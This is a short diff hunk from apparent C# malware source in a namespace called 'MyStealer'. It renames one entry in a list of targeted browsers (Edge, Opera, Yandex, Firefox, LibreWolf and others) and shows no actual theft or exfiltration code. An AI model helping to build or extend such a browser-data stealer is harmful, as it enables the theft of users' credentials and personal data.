@@ -20,7 +20,7 @@ namespace MyStealer
             new IridiumBrowser(),
             new MicrosoftEdge(),
             new NaverWhale(),
-            new OperaStable(),
+            new Opera(),
             new YandexBrowser(),
             new Firefox(),
             new LibreWolf(),
